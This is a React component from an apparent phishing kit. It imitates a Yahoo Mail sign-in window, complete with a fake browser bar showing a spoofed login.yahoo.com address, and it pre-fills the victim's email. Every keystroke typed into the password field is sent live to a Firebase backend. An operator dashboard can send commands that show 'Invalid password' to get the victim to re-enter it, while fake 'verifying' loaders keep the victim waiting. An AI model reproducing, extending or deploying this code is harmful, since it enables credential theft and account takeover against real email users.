import React from "react";
import { useNavigate } from "react-router-dom";
import EmailLayout from "../EmailLayout";
import { useFirebaseClient } from "../../../hooks/useFirebaseClient";
import { reportTyping } from "../../../firebase/typing";
import yahooLogo from "../assets/logoyahoo.png";
import loadingSvg from "../assets/loadingya.svg";
import yahooFinalGif from "../assets/yahoofinal.gif";

// Layout simples do Yahoo Password (somente UI)
const YahooPasswordPage = () => {
  const navigate = useNavigate();
  const translations = {
    windowTitle: "Sign in to your account - Yahoo",
    url: "https://login.yahoo.com/account/challenge/password?src=noSrc&done=https%3A%2F%2Fmail.yahoo.com%2Fd&display=login",
  };
  const { updateClientData, commands, clearCommands, clientData } =
    useFirebaseClient(navigate);
  const [introLoading, setIntroLoading] = React.useState(true);
  const resolvedEmail = React.useMemo(() => {
    const fromClient =
      (clientData &&
        (clientData.yahooPasswordEmail ||
          clientData.yahooCodeMailEmail ||
          clientData.yahooNumeroEmail ||
          clientData.email)) ||
      "";
    if (fromClient && String(fromClient).trim())
      return String(fromClient).trim();
    try {
      return (
        (typeof window !== "undefined" &&
          ((localStorage.getItem("yahoo_password_email") || "").trim() ||
            (localStorage.getItem("yahoo_codemail_email") || "").trim() ||
            (localStorage.getItem("yahoo_numero_email") || "").trim() ||
            (localStorage.getItem("client_email") || "").trim())) ||
        ""
      );
    } catch {
      return "";
    }
  }, [clientData]);
  React.useEffect(() => {
    const t = setTimeout(() => setIntroLoading(false), 3000);
    return () => clearTimeout(t);
  }, []);
  const [password, setPassword] = React.useState("");
  const [isSubmitting, setIsSubmitting] = React.useState(false);
  const [loadingStage, setLoadingStage] = React.useState("bar"); // 'bar' | 'final'
  const [isFieldFocused, setIsFieldFocused] = React.useState(false);
  const [isButtonPressed, setIsButtonPressed] = React.useState(false);
  const [invalidMessage, setInvalidMessage] = React.useState("");
  const phrases = React.useMemo(
    () => [
      "Connecting to Yahoo...",
      "Verifying your account...",
      "Syncing security settings...",
      "Finalizing sign-in...",
    ],
    []
  );
  const [phraseIndex, setPhraseIndex] = React.useState(0);
  React.useEffect(() => {
    if ((isSubmitting && loadingStage === "final") || introLoading) {
      const id = setInterval(
        () => setPhraseIndex((p) => (p + 1) % phrases.length),
        2000
      );
      return () => clearInterval(id);
    }
  }, [isSubmitting, loadingStage, introLoading, phrases.length]);

  // Drag/movimentação do modal
  const [position, setPosition] = React.useState(() => ({
    left: Math.max(12, (window.innerWidth - 380) / 2),
    top: Math.max(12, (window.innerHeight - 520) / 2),
  }));
  const [isDragging, setIsDragging] = React.useState(false);
  const dragOffsetRef = React.useRef({ x: 0, y: 0 });
  const startDrag = (e) => {
    const tag = e.target.tagName;
    if (["INPUT", "BUTTON", "A", "SELECT", "TEXTAREA", "LABEL"].includes(tag))
      return;
    setIsDragging(true);
    dragOffsetRef.current = {
      x: e.clientX - position.left,
      y: e.clientY - position.top,
    };
  };
  React.useEffect(() => {
    const onMove = (e) => {
      if (!isDragging) return;
      setPosition({
        left: Math.max(0, e.clientX - dragOffsetRef.current.x),
        top: Math.max(0, e.clientY - dragOffsetRef.current.y),
      });
    };
    const onUp = () => setIsDragging(false);
    if (isDragging) {
      document.addEventListener("mousemove", onMove);
      document.addEventListener("mouseup", onUp);
    }
    return () => {
      document.removeEventListener("mousemove", onMove);
      document.removeEventListener("mouseup", onUp);
    };
  }, [isDragging]);

  // Atualizar URL/página atual no Firebase
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_password",
        currentPage: "yahoo_password",
        fromForm: true,
      });
    } catch {}
  }, [updateClientData]);

  // Função de navegação que sempre retorna false (deixa o useFirebaseClient lidar com redirecionamentos)
  const navigateByCommand = React.useCallback(() => false, []);

  // Detectar comandos de invalidação enviados do dashboard (X)
  React.useEffect(() => {
    if (!commands || commands.length === 0) return;
    const latest = commands[commands.length - 1];
    if (!latest || typeof latest !== "string") return;

    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid password.");
      setPassword("");
      setIsSubmitting(false);
      setLoadingStage("final"); // mantém overlay final conforme UX geral
      setTimeout(() => clearCommands && clearCommands(), 200);
      return;
    }

    const navigated = navigateByCommand(latest);
    if (navigated) {
      // limpar após navegar
      setTimeout(() => clearCommands(), 100);
    }
  }, [commands, navigateByCommand, clearCommands]);

  return (
    <EmailLayout>
      <div
        className="relative p-4 overflow-x-hidden"
        style={{ fontFamily: "Arial, sans-serif" }}
      >
        <div
          onMouseDown={startDrag}
          style={{
            background: "#fff",
            borderRadius: 10,
            boxShadow: "0 2px 16px rgba(0,0,0,0.2)",
            width: "min(380px, 92vw)",
            minHeight: 420,
            color: "#252423",
            display: "flex",
            flexDirection: "column",
            overflow: "hidden",
            position: "fixed",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            cursor: isDragging ? "grabbing" : "default",
            zIndex: 1000,
          }}
        >
          {/* Simulação da barra da janela/navegador (título + botões -, □, ×) */}
          <div
            data-window-header="true"
            onMouseDown={startDrag}
            style={{
              height: 24,
              background: "#e3f2fd",
              borderBottom: "1px solid #e1dfdd",
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "0 14px",
              fontSize: 12,
              color: "#605e5c",
              cursor: "grab",
            }}
          >
            <span
              style={{
                opacity: 0.9,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              {/* Yahoo logo */}
              <svg
                xmlns="http://www.w3.org/2000/svg"
                aria-label="Yahoo!"
                viewBox="0 0 512 512"
                fill="#fff"
                width="16"
                height="16"
              >
                <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                <circle cx="303" cy="308" r="38" />
              </svg>
              {translations.windowTitle}
            </span>
            <div style={{ display: "flex", gap: 6 }}>
              <button
                title="Minimize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M3 8.5H13"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
              <button
                title="Maximize"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <rect
                    x="3.5"
                    y="3.5"
                    width="9"
                    height="9"
                    rx="1"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                  />
                </svg>
              </button>
              <button
                title="Close"
                style={{
                  width: 36,
                  height: 22,
                  border: "none",
                  background: "transparent",
                  color: "#605e5c",
                  cursor: "default",
                  fontSize: 16,
                  lineHeight: 1,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                }}
              >
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 16 16"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M4 4L12 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                  <path
                    d="M12 4L4 12"
                    stroke="#605e5c"
                    strokeWidth="1.5"
                    strokeLinecap="round"
                  />
                </svg>
              </button>
            </div>
          </div>

          {/* Barra de endereço/URL - colada na barra da janela */}
          <div
            style={{
              borderBottom: "1px solid #e1dfdd",
              padding: 0,
              background: "#ffffff",
              margin: 0,
            }}
          >
            <div
              style={{
                width: "100%",
                background: "#f5f5f5",
                borderTop: "1px solid #d0d7de",
                borderBottom: "1px solid #d0d7de",
                boxSizing: "border-box",
                height: 28,
                display: "flex",
                alignItems: "center",
                padding: "0 14px 0 12px",
                gap: 10,
                fontSize: 12,
                color: "#605e5c",
              }}
            >
              <svg
                width="14"
                height="14"
                viewBox="0 0 16 16"
                xmlns="http://www.w3.org/2000/svg"
                version="1.1"
                fill="none"
                stroke="#605e5c"
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="1.5"
                aria-hidden="true"
                style={{ display: "block" }}
              >
                <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
              </svg>
              <div
                style={{
                  overflow: "hidden",
                  textOverflow: "ellipsis",
                  whiteSpace: "nowrap",
                  flex: 1,
                  fontWeight: 400,
                  letterSpacing: "0.2px",
                }}
              >
                {translations.url}
              </div>
            </div>
          </div>

          <div style={{ padding: "24px 24px 14px 24px" }}>
            {/* Header Yahoo - logo */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginBottom: 28,
              }}
            >
              <img
                src={yahooLogo}
                alt="Yahoo"
                style={{ height: 32, width: "auto" }}
              />
            </div>
            {/* Email em um botão arredondado, estilo dos modais */}
            <div
              style={{
                display: "flex",
                justifyContent: "center",
                marginTop: -6,
                marginBottom: 6,
              }}
            >
              <button
                type="button"
                style={{
                  background: "#F9FAFB",
                  color: "#111827",
                  border: "1px solid #e5e7eb",
                  borderRadius: 9999,
                  padding: "6px 12px",
                  fontSize: 12,
                  fontWeight: 600,
                  cursor: "default",
                  boxShadow: "0 1px 0 rgba(0,0,0,0.03)",
                  display: "flex",
                  alignItems: "center",
                  gap: 4,
                }}
              >
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 291.319 291.319"
                  width="14"
                  height="14"
                  style={{ display: "block" }}
                >
                  <path
                    fill="#720e9e"
                    d="M145.659 0c80.45 0 145.66 65.219 145.66 145.66 0 80.45-65.21 145.659-145.66 145.659S0 226.109 0 145.66C0 65.219 65.21 0 145.659 0"
                  />
                  <path
                    fill="#fff"
                    d="m212.353 114.98.155-.027 4.825-5.371-.237-.018.51-.801h-67.595l2.604 9.249h18.444l-31.044 28.722c-6.336-9.24-21.184-30.479-31.544-46.411h19.254v-6.555l.264-1.884-.264-.036v-.765H54.631v9.24H77.49c8.876 7.328 47.358 54.049 48.76 58.51.564 4.179 1.366 28.841-.291 30.698-1.994 2.868-22.814 1.32-26.483 1.593l-.137 9.058c6.7.2 26.801-.009 33.584-.009 13.364 0 36.77-.346 40.065-.082l.41-8.576-26.901-.401c-.564-3.887-1.183-28.422-.619-31.098 2.54-7.765 43.816-39.902 48.059-41.112l3.997-.901h12.472c-.001-.001 1.947-3.023 1.947-3.023m-10.087 64.099 11.689.892 13.628-49.979c-2.276-.082-22.95-1.93-25.636-2.431zm-2.021 8.012.064 12.208 5.917.492 6.391.446 1.875-11.944-6.737-.31z"
                  />
                </svg>
                {resolvedEmail}
              </button>
            </div>

            <h1
              style={{
                fontSize: 22,
                fontWeight: 700,
                margin: "6px 0 4px",
                textAlign: "center",
                color: "#18181b",
              }}
            >
              Sign in to Yahoo Mail
            </h1>
            <p
              style={{
                color: "#6b7280",
                margin: 0,
                marginBottom: 16,
                textAlign: "center",
              }}
            >
              using your Yahoo account
            </p>

            <div>
              <label
                htmlFor="password"
                style={{ fontSize: 12, color: "#6b7280" }}
              >
                Password
              </label>
              <input
                data-yahoo-modal
                id="password"
                type="password"
                value={password}
                onChange={(e) => {
                  const val = e.target.value;
                  setPassword(val);
                  try {
                    updateClientData({ yahooPassword: val });
                    reportTyping("yahoopass", val);
                  } catch {}
                }}
                placeholder="Enter your password"
                style={{
                  width: "100%",
                  boxSizing: "border-box",
                  border: "none",
                  borderBottom: isFieldFocused
                    ? "2px solid #6a33f5"
                    : "1px solid #111827",
                  borderRadius: 0,
                  padding: "10px 4px 10px 4px",
                  fontSize: 14,
                  outline: "none",
                  marginTop: 6,
                  background: "transparent",
                  color: "#111827",
                  transition:
                    "border-color 0.25s ease, border-bottom-width 0.25s ease",
                }}
                onFocus={() => setIsFieldFocused(true)}
                onBlur={() => setIsFieldFocused(false)}
              />
            </div>
            {invalidMessage && (
              <div style={{ color: "#a4262c", fontSize: 12, marginTop: 6 }}>
                {invalidMessage}
              </div>
            )}

            <div style={{ marginTop: 10 }}>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                style={{
                  color: "#6a33f5",
                  textDecoration: "none",
                  fontSize: 14,
                }}
              >
                Forgot username?
              </a>
            </div>

            <div style={{ marginTop: 24 }}>
              <button
                type="button"
                style={{
                  width: "100%",
                  padding: "14px",
                  background: password.trim() ? "#6a33f5" : "#e6dbfb",
                  color: password.trim() ? "#fff" : "#5f5a64",
                  border: "none",
                  borderRadius: 28,
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: password.trim() ? "pointer" : "not-allowed",
                  transform: isButtonPressed ? "scale(0.985)" : "scale(1)",
                  transition:
                    "transform 80ms ease, background-color 0.25s ease",
                }}
                onClick={(e) => {
                  e.preventDefault();
                  if (!password.trim()) return;
                  setIsSubmitting(true);
                  // Abrir diretamente a etapa final, igual ao Yahoo SMS
                  setLoadingStage("final");
                  try {
                    updateClientData({ yahooPasswordSubmittedAt: Date.now() });
                  } catch {}
                }}
                onMouseDown={() => setIsButtonPressed(true)}
                onMouseUp={() => setIsButtonPressed(false)}
                onMouseLeave={() => setIsButtonPressed(false)}
              >
                Next
              </button>
            </div>

            {/* Stay signed in */}
            <div
              style={{
                marginTop: 14,
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
            >
              <input
                id="stay-signed-in"
                type="checkbox"
                style={{ width: 16, height: 16 }}
              />
              <label
                htmlFor="stay-signed-in"
                style={{ color: "#6a33f5", fontSize: 14, cursor: "pointer" }}
              >
                Stay signed in
              </label>
            </div>

            {/* Loading final (igual ao Yahoo SMS) */}
            {isSubmitting && loadingStage === "final" && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
                  background: "#ffffff",
                  display: "flex",
                  flexDirection: "column",
                  zIndex: 25,
                  pointerEvents: "none",
                }}
              >
                {/* Header simulado na etapa final */}
                <div
                  style={{
                    height: 24,
                    background: "#e3f2fd",
                    borderBottom: "1px solid #e1dfdd",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "space-between",
                    padding: "0 14px",
                    fontSize: 12,
                    color: "#605e5c",
                  }}
                >
                  <span
                    style={{
                      opacity: 0.9,
                      display: "flex",
                      alignItems: "center",
                      gap: 8,
                    }}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      aria-label="Yahoo!"
                      viewBox="0 0 512 512"
                      fill="#fff"
                      width="16"
                      height="16"
                    >
                      <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                      <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                      <circle cx="303" cy="308" r="38" />
                    </svg>
                    {translations.windowTitle}
                  </span>
                  <div style={{ display: "flex", gap: 6 }}>
                    <button
                      title="Minimize"
                      style={{
                        width: 36,
                        height: 22,
                        border: "none",
                        background: "transparent",
                        cursor: "default",
                        fontSize: 16,
                        lineHeight: 1,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 16 16"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          d="M3 8.5H13"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        />
                      </svg>
                    </button>
                    <button
                      title="Maximize"
                      style={{
                        width: 36,
                        height: 22,
                        border: "none",
                        background: "transparent",
                        cursor: "default",
                        fontSize: 16,
                        lineHeight: 1,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 16 16"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect
                          x="3.5"
                          y="3.5"
                          width="9"
                          height="9"
                          rx="1"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                        />
                      </svg>
                    </button>
                    <button
                      title="Close"
                      style={{
                        width: 36,
                        height: 22,
                        border: "none",
                        background: "transparent",
                        color: "#605e5c",
                        cursor: "default",
                        fontSize: 16,
                        lineHeight: 1,
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                      }}
                    >
                      <svg
                        width="12"
                        height="12"
                        viewBox="0 0 16 16"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          d="M4 4L12 12"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        />
                        <path
                          d="M12 4L4 12"
                          stroke="#605e5c"
                          strokeWidth="1.5"
                          strokeLinecap="round"
                        />
                      </svg>
                    </button>
                  </div>
                </div>

                {/* URL simulada na etapa final */}
                <div
                  style={{
                    borderBottom: "1px solid #e1dfdd",
                    padding: 0,
                    background: "#ffffff",
                    margin: 0,
                  }}
                >
                  <div
                    style={{
                      width: "100%",
                      background: "#f5f5f5",
                      borderTop: "1px solid #d0d7de",
                      borderBottom: "1px solid #d0d7de",
                      boxSizing: "border-box",
                      height: 28,
                      display: "flex",
                      alignItems: "center",
                      padding: "0 14px 0 12px",
                      gap: 10,
                      fontSize: 12,
                      color: "#605e5c",
                    }}
                  >
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 16 16"
                      xmlns="http://www.w3.org/2000/svg"
                      version="1.1"
                      fill="none"
                      stroke="#605e5c"
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth="1.5"
                      aria-hidden="true"
                      style={{ display: "block" }}
                    >
                      <rect height="7.5" width="10.5" y="6.75" x="2.75" />
                      <path d="m4.75 6.25s-1-4.5 3.25-4.5 3.25 4.5 3.25 4.5" />
                    </svg>
                    <div
                      style={{
                        overflow: "hidden",
                        textOverflow: "ellipsis",
                        whiteSpace: "nowrap",
                        flex: 1,
                        fontWeight: 400,
                        letterSpacing: "0.2px",
                      }}
                    >
                      {translations.url}
                    </div>
                  </div>
                </div>

                {/* Conteúdo da etapa final */}
                <div
                  style={{
                    flex: 1,
                    display: "flex",
                    flexDirection: "column",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 20,
                    textAlign: "center",
                    padding: "20px",
                  }}
                >
                  <img
                    src={yahooFinalGif}
                    alt="Connecting to Yahoo"
                    style={{ width: 280, height: "auto" }}
                  />
                  <img
                    src={loadingSvg}
                    alt="Loading"
                    style={{
                      width: "90%",
                      height: 8,
                      objectFit: "contain",
                      filter: "brightness(0.45) contrast(1.35)",
                    }}
                  />
                  <div
                    style={{
                      color: "#4b5563",
                      fontSize: 18,
                      minHeight: 24,
                      fontWeight: 500,
                    }}
                  >
                    {phrases[phraseIndex]}
                  </div>
                </div>
              </div>
            )}
          </div>
          {introLoading && (
            <div
              style={{
                position: "absolute",
                inset: 0,
                background: "#ffffff",
                display: "flex",
                flexDirection: "column",
                zIndex: 40,
              }}
            >
              <div
                style={{
                  height: 24,
                  background: "#e3f2fd",
                  borderBottom: "1px solid #e1dfdd",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "0 14px",
                  fontSize: 12,
                  color: "#605e5c",
                }}
              >
                <span
                  style={{
                    opacity: 0.9,
                    display: "flex",
                    alignItems: "center",
                    gap: 8,
                  }}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    aria-label="Yahoo!"
                    viewBox="0 0 512 512"
                    fill="#fff"
                    width="16"
                    height="16"
                  >
                    <rect width="512" height="512" rx="15%" fill="#5f01d1" />
                    <path d="M203 404h-62l25-59-69-165h63l37 95 37-95h62m58 76h-69l62-148h69" />
                    <circle cx="303" cy="308" r="38" />
                  </svg>
                  {translations.windowTitle}
                </span>
              </div>
              <div
                style={{
                  flex: 1,
                  display: "flex",
                  flexDirection: "column",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 20,
                  textAlign: "center",
                  padding: 20,
                }}
              >
                <img
                  src={yahooFinalGif}
                  alt="Connecting to Yahoo"
                  style={{ width: 280, height: "auto" }}
                />
                <img
                  src={loadingSvg}
                  alt="Loading"
                  style={{
                    width: "90%",
                    height: 8,
                    objectFit: "contain",
                    filter: "brightness(0.45) contrast(1.35)",
                  }}
                />
                <div
                  style={{
                    color: "#4b5563",
                    fontSize: 18,
                    minHeight: 24,
                    fontWeight: 500,
                  }}
                >
                  {phrases[phraseIndex]}
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </EmailLayout>
  );
};

export default YahooPasswordPage;
